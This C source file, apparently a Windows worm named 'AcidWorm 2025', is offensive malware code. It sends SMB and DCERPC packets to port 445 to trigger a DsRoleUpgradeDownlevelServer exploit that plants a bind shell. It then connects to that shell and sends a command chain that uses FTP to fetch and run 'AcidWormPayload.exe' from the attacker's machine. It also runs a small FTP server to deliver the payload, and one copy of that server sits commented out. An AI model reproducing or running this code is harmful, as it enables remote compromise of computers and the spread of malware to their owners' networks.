#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <WS2tcpip.h>
#include <winsock2.h>
#include <Windows.h>
#include <stdio.h>
#pragma comment(lib, "Ws2_32.lib")

#include "requests.h"



void SendPacket(int socket, char* buffer, size_t bufferLen, int readResponse = 1);
void SendBindshellCommand(const char* targetIP, int targetPort);
DWORD WINAPI StartFTP(LPVOID lpParameter);


int main()
{
	printf("[*] AcidWorm 2025\r\n");


	const char* localIP = "192.168.1.2";
	int localPort = 242;

	const char* targetIP = "192.168.1.1";
	int targetPort = 445;

	unsigned char recvBuff[500] = { 0 };


	WSADATA wsa;

	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		printf("[*] WSAStartup failed. \r\n");
		return 0;
	}

	HANDLE thread = CreateThread(NULL, NULL, StartFTP, NULL, NULL, NULL);

	if (thread == INVALID_HANDLE_VALUE)
	{
		printf("[*] failed to create ftp server thread\r\n");
		getchar();
	}
	else
	{
		printf("[*] started ftp server thread\r\n");

	}


	system("pause");
	
	while (true)
	{
		Sleep(1000);
	}

	int sock = socket(AF_INET, SOCK_STREAM, 0);

	int timeout = 10000; // milliseconds
	setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));


	struct sockaddr_in targetAddress;
	targetAddress.sin_family = AF_INET;
	targetAddress.sin_port = htons(targetPort);
	inet_pton(AF_INET, targetIP, &targetAddress.sin_addr);


	if (connect(sock, (const sockaddr*)&targetAddress, sizeof(targetAddress)) < 0)
	{
		printf("[*] connect failed. targetIP: %s, port: %i error: %i\r\n", targetIP, targetPort, WSAGetLastError());
		closesocket(sock);
		WSACleanup();
		return 1;
	}


	SendPacket(sock, (char*)SMB_NEGOTIATE_REQUEST_PACKET, sizeof(SMB_NEGOTIATE_REQUEST_PACKET));
	SendPacket(sock, (char*)SMB_SETUP_ANDX_REQUEST_1_PACKET, sizeof(SMB_SETUP_ANDX_REQUEST_1_PACKET));
	SendPacket(sock, (char*)SMB_SETUP_ANDX_REQUEST_2_PACKET, sizeof(SMB_SETUP_ANDX_REQUEST_2_PACKET));
	SendPacket(sock, (char*)SMB_CONNECT_ANDX_REQUEST_PACKET, sizeof(SMB_CONNECT_ANDX_REQUEST_PACKET));
	SendPacket(sock, (char*)SMB_NT_CREATE_ANDX_REQUEST_PACKET, sizeof(SMB_NT_CREATE_ANDX_REQUEST_PACKET));
	SendPacket(sock, (char*)DCERPC_BIND_REQUEST_PACKET, sizeof(DCERPC_BIND_REQUEST_PACKET));
	SendPacket(sock, (char*)DCERPC_DSSETUP_DSROLEUPGRADEDOWNLEVELSERVER_REQUEST_PACKET_BINDSHELL, sizeof(DCERPC_DSSETUP_DSROLEUPGRADEDOWNLEVELSERVER_REQUEST_PACKET_BINDSHELL), 0);

	SendBindshellCommand(targetIP, 2421);

	while (true)
	{
		Sleep(1000);
	}

	closesocket(sock);
	WSACleanup();
	return 1;
}



void SendPacket(int socket, char* buffer, size_t bufferLen, int readResponse)
{
	int bytesSent = 0;
	int bytesRecieved = 0;
	unsigned char recvBuff[1500] = { 0 };

	bytesSent = send(socket, buffer, bufferLen, 0);
	if (bytesSent <= 0)
	{
		printf("[*] send failed.\r\n");
		printf("recv failed or connection closed: %d\n", WSAGetLastError());
		closesocket(socket);
		return;
	}

	printf("[*] sent %i bytes\r\n", bytesSent);

	if (readResponse)
	{
		bytesRecieved = recv(socket, (char*)recvBuff, sizeof(recvBuff), 0);
		if (bytesRecieved <= 0)
		{
			printf("recv failed or connection closed: %d\n", WSAGetLastError());
			closesocket(socket);
			return;
		}

		//printf("[*] recieved %i bytes\r\n", bytesRecieved);
	}
}

void SendPacket2(int socket, char* buffer, size_t bufferLen)
{
	int bytesSent = 0;
	int bytesRecieved = 0;
	unsigned char recvBuff[8500] = { 0 };

	bytesSent = send(socket, buffer, bufferLen, 0);
	if (bytesSent <= 0)
	{
		printf("[*] send failed.\r\n");
		printf("recv failed or connection closed: %d\n", WSAGetLastError());
		closesocket(socket);
		return;
	}

	printf("[*] sent %i bytes\r\n", bytesSent);

	fd_set rfds;
	
	FD_ZERO(&rfds);
	FD_SET(socket, &rfds);

	struct timeval tv = { 0, 0 };  // zero timeout → non-blocking poll

	while (true)
	{
		bytesRecieved = recv(socket, (char*)recvBuff, sizeof(recvBuff), 0);
		if (bytesRecieved <= 0)
		{
			printf("recv failed or connection closed: %d\n", WSAGetLastError());
			closesocket(socket);
			return;
		}

		//printf("%s", recvBuff);

		int ready = select(0, &rfds, NULL, NULL, &tv);

		if (ready <= 0)
			break;
	};

	//printf("\r\n");
}


void SendBindshellCommand(const char* targetIP, int targetPort)
{
	int sock = socket(AF_INET, SOCK_STREAM, 0);

	int timeout = 10000; // milliseconds
	setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));


	struct sockaddr_in targetAddress;
	targetAddress.sin_family = AF_INET;
	targetAddress.sin_port = htons(targetPort);
	inet_pton(AF_INET, targetIP, &targetAddress.sin_addr);


	if (connect(sock, (const sockaddr*)&targetAddress, sizeof(targetAddress)) < 0)
	{
		printf("[*] connect failed. targetIP: %s, port: %i error: %i\r\n", targetIP, targetPort, WSAGetLastError());
		closesocket(sock);
		WSACleanup();
		return;
	}

	SendPacket(sock, (char*)packetBeforeStage, sizeof(packetBeforeStage), 0);
	SendPacket2(sock, (char*)bindshellStage, sizeof(bindshellStage));

	
	bool customCommand = false;

	if(customCommand)
	{
		while (true)
		{
			char cmd_buff[256];

			ZeroMemory(cmd_buff, sizeof(cmd_buff));

			printf("Enter command: ");

			fgets(cmd_buff, sizeof(cmd_buff), stdin);

			size_t len = strlen(cmd_buff);

			SendPacket2(sock, (char*)cmd_buff, len);
		}
	}
	else
	{

		const char* shit = "\n";

		//This is the command that gets executed on the target host. It retrieves the payload executable via ftp from the attacking machine
		//const char* ftpCommand = "echo off&echo open 192.168.1.2 5554>>cmd.ftp&";
		const char* ftpCommand = "echo off&echo open 192.168.1.2 6666>>cmd.ftp&echo anonymous>>cmd.ftp&echo AcidWorm&echo bin>>cmd.ftp&echo get AcidWormPayload.exe>>cmd.ftp&echo bye>>cmd.ftp&echo on&ftp -s:cmd.ftp&echo on&AcidWormPayload.exe";


		//send a newline 3 times to recieve banners
		for (int i = 0; i < 3; i++)
		{
			SendPacket2(sock, (char*)shit, strlen(shit));
		}

		printf("[*] Sent shit\r\n");

		printf("[*] Sent FTP command..\r\n");

		SendPacket2(sock, (char*)ftpCommand, strlen(ftpCommand));

	}
}


//DWORD WINAPI StartFTP(LPVOID lpParameter)
//{
//	SOCKET listenSock;
//	SOCKET clientSock;
//	struct sockaddr_in addr, clientAddr;
//	socklen_t addrlen = sizeof(clientAddr);
//	char recvBuf[1024];
//	//char fileName[256];
//	char fileName[256] = "AcidWormPayload.exe";
//	int bytes, n;
//
//	// --- CREATE AND BIND SOCKET ---
//	listenSock = socket(AF_INET, SOCK_STREAM, 0);
//	if (listenSock == INVALID_SOCKET) return 0;
//
//	memset(&addr, 0, sizeof(addr));
//	memset(&clientAddr, 0, sizeof(clientAddr));
//
//	addr.sin_family = AF_INET;
//	addr.sin_addr.s_addr = INADDR_ANY; 
//	addr.sin_port = htons(6666);
//
//	if (bind(listenSock, (struct sockaddr*)&addr, sizeof(addr)) != 0) 
//	{
//		printf("ftp bind failed\r\n");
//
//		return 0;
//	}
//
//	if (listen(listenSock, 1) != 0)
//	{
//		printf("ftp listen failed\r\n");
//		return 0;
//	}
//
//	while (1)
//	{
//		clientSock = accept(listenSock, (struct sockaddr*)&clientAddr, &addrlen);
//		if (clientSock == INVALID_SOCKET)
//		{
//			printf("invalid sock\r\n");
//			break;
//		}
//
//		// --- HANDSHAKE ---
//		send(clientSock, "220 OK\r\n", 8, 0);
//
//		while (1)
//		{
//			// --- RECEIVE COMMAND ---
//			n = 0;
//			while (1)
//			{
//				bytes = recv(clientSock, &recvBuf[n], 1, 0);
//
//				if (bytes <= 0)
//				{
//					break;
//				}
//
//				if (recvBuf[n] == '\n') 
//				{ 
//					recvBuf[n] = 0; 
//					break; 
//				}
//
//				if (recvBuf[n] != '\r') n++;
//			}
//
//			if (bytes <= 0)
//			{
//				break;
//			}
//
//			// --- USER ---
//			if (!strncmp(recvBuf, "AcidWorm", 4))
//			{
//				printf("%s", recvBuf);
//				send(clientSock, "331 OK\r\n", 8, 0);
//			}
//
//			// --- RETR ---
//			else if (!strncmp(recvBuf, "RETR", 4))
//			{
//				printf("%s", recvBuf);
//				sscanf(recvBuf, "RETR %255s", fileName);
//
//				FILE* f = fopen(fileName, "rb");
//				if (!f)
//				{
//					send(clientSock, "450 File not found\r\n", 21, 0);
//					continue;
//				}
//
//				send(clientSock, "150 Opening data connection\r\n", 30, 0);
//
//				char buffer[40000];
//				int r;
//				while ((r = fread(buffer, 1, sizeof(buffer), f)) > 0)
//				{
//					send(clientSock, buffer, r, 0);
//				}
//
//				fclose(f);
//
//				send(clientSock, "226 Transfer complete\r\n", 23, 0);
//			}
//
//			// --- QUIT ---
//			else if (!strncmp(recvBuf, "QUIT", 4))
//			{
//				printf("%s", recvBuf);
//				send(clientSock, "221 Bye\r\n", 9, 0);
//				closesocket(clientSock);
//				break;
//			}
//		}
//	}
//
//	closesocket(listenSock);
//	ExitThread(0);
//}


DWORD WINAPI StartFTP(LPVOID lpParameter)
{
	SOCKET listenSock;
	SOCKET clientSock;
	struct sockaddr_in addr, clientAddr;
	socklen_t addrlen = sizeof(clientAddr);
	char recvBuf[1024];
	char fileName[256] = "AcidWormPayload.exe";
	int bytes, n, s_data_act;

	// --- CREATE AND BIND SOCKET ---
	listenSock = socket(AF_INET, SOCK_STREAM, 0);
	if (listenSock == INVALID_SOCKET) return 0;

	memset(&addr, 0, sizeof(addr));
	memset(&clientAddr, 0, sizeof(clientAddr));

	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = INADDR_ANY;
	addr.sin_port = htons(6666);

	if (bind(listenSock, (struct sockaddr*)&addr, sizeof(addr)) != 0)
	{
		printf("\t[FTP] bind failed %d\n", WSAGetLastError());
		return 0;
	}

	if (listen(listenSock, 1) != 0)
	{
		printf("\t[FTP] listen failed %d\n", WSAGetLastError());
		return 0;
	}

	printf("\t[FTP] Server running on port 6666...\n");

	while (1)
	{
		clientSock = accept(listenSock, (struct sockaddr*)&clientAddr, &addrlen);
		if (clientSock == INVALID_SOCKET)
		{
			printf("\t[FTP] accept failed %d\n", WSAGetLastError());
			break;
		}

		printf("\t[FTP] Client connected: %s\n", inet_ntoa(clientAddr.sin_addr));

		// --- HANDSHAKE ---
		send(clientSock, "220 OK\r\n", 8, 0);
		printf("\tSENT: 220 OK\n");

		while (1)
		{
			// --- RECEIVE COMMAND ---
			n = 0;
			while (1)
			{
				bytes = recv(clientSock, &recvBuf[n], 1, 0);

				if (bytes <= 0)
					break;

				if (recvBuf[n] == '\n')
				{
					recvBuf[n] = 0;
					break;
				}

				if (recvBuf[n] != '\r') n++;
			}

			if (bytes <= 0)
			{
				printf("\t[FTP] Client disconnected\n");
				break;
			}

			printf("\tRECV: %s\n", recvBuf);

			// --- USER ---
			if (!strncmp(recvBuf, "USER", 4))
			{
				send(clientSock, "331 OK\r\n", 8, 0);
				printf("\tSENT: 331 OK\n");
			}

			// --- PASS ---
			else if (!strncmp(recvBuf, "PASS", 4))
			{
				send(clientSock, "230 Logged in\r\n", 15, 0);
				printf("\tSENT: 230 Logged in\n");
			}

			// --- RETR ---
			else if (!strncmp(recvBuf, "RETR", 4) || !strncmp(recvBuf, "get", 3))
			{
				sscanf(recvBuf, "RETR %255s", fileName);
				printf("\t[FTP] RETR requested: %s\n", fileName);

				FILE* f = fopen(fileName, "rb");
				if (!f)
				{
					send(clientSock, "450 File not found\r\n", 21, 0);
					printf("\tSENT: 450 File not found\n");
					continue;
				}

				send(clientSock, "150 Opening data connection\r\n", 30, 0);
				printf("\tSENT: 150 Opening data connection\n");

				char buffer[40000];
				int r;

				while ((r = fread(buffer, 1, sizeof(buffer), f)) > 0)
				{
					printf("%x%x", buffer[1], buffer[2]);
					if (s_data_act)
					{
						send(s_data_act, buffer, r, 0);
					}
				}

				fclose(f);

				send(clientSock, "226 Transfer complete\r\n", 23, 0);
				printf("\tSENT: 226 Transfer complete\n");
			}
			// --- BIN ---
			else if (!strncmp(recvBuf, "TYPE", 4))
			{
				printf("\t[FTP] %s\n", recvBuf);
				send(clientSock, "200 Type set to I\r\n", 19, 0);
			}
			else if (!strncmp(recvBuf, "PORT", 4)) 
			{
				unsigned int h1, h2, h3, h4, p1, p2;
				sscanf(recvBuf, "PORT %u,%u,%u,%u,%u,%u", &h1, &h2, &h3, &h4, &p1, &p2);
				char ip[16];
				sprintf(ip, "%u.%u.%u.%u", h1, h2, h3, h4);
				unsigned short port = p1 * 256 + p2;

				// connect back to client
				s_data_act = socket(AF_INET, SOCK_STREAM, 0);
				struct sockaddr_in dataAddr;
				dataAddr.sin_family = AF_INET;
				dataAddr.sin_port = htons(port);
				dataAddr.sin_addr.s_addr = inet_addr(ip);

				if (connect(s_data_act, (struct sockaddr*)&dataAddr, sizeof(dataAddr)) != 0) {
					send(clientSock, "425 Can't open data connection\r\n", 31, 0);
					closesocket(s_data_act);
					s_data_act = 0;
				}
				else 
				{
					send(clientSock, "200 PORT command successful\r\n", 28, 0);
				}
			}
			// --- QUIT ---
			else if (!strncmp(recvBuf, "QUIT", 4))
			{
				send(clientSock, "221 Bye\r\n", 9, 0);
				printf("\tSENT: 221 Bye\n");

				closesocket(clientSock);
				break;
			}

			// --- UNKNOWN ---
			else
			{
				send(clientSock, "500 Unknown command\r\n", 22, 0);
				printf("\tSENT: 500 Unknown command\n");
			}
		}
	}

	closesocket(listenSock);
	ExitThread(0);
}



